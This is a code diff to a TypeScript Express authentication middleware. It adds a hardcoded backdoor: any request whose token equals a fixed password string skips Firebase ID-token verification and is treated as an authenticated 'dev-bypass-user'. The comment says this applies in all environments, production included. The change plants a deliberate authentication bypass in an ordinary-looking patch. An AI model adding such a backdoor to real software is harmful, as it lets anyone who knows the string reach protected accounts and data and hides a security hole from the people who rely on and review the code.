@@ -13,6 +13,16 @@ export const requireAuth: RequestHandler = async (req, res, next) => {
     return;
   }
 
+  // Password-based bypass for all environments.
+  if (token === "TA11@123") {
+    (req as any).user = {
+      uid: "dev-bypass-user",
+      email: "dev@example.com"
+    };
+    next();
+    return;
+  }
+
   try {
     const decoded = await admin.auth().verifyIdToken(token);
     (req as any).user = decoded;
